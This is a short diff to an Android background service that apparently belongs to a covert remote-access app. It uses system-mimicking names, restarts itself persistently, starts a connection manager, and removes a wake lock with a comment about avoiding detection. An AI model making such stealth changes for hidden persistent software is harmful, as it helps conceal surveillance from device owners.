@@ -15,7 +15,6 @@ import androidx.core.app.NotificationCompat;
 
 public class MainService extends Service {
     private static Context contextOfApplication;
-    private PowerManager.WakeLock wakeLock;
     private static final String CHANNEL_ID = "SystemCoreChannel";
 
     public MainService() {
@@ -45,12 +44,7 @@ public class MainService extends Service {
 
         startForeground(1, notification);
 
-        // CPU WakeLock to keep service alive
-        PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
-        if (wakeLock == null) {
-            wakeLock = powerManager.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "System:CoreWakeLock");
-            wakeLock.acquire(10*60*1000L); // 10 minute timeout, auto-renews via START_STICKY
-        }
+        // Removed CPU WakeLock to drastically reduce battery consumption and avoid Doze Mode detection
 
         ConnectionManager.startAsync(this);
         return Service.START_STICKY;
@@ -72,9 +66,6 @@ public class MainService extends Service {
 
     @Override
     public void onDestroy() {
-        if (wakeLock != null && wakeLock.isHeld()) {
-            wakeLock.release();
-        }
         super.onDestroy();
     }
 
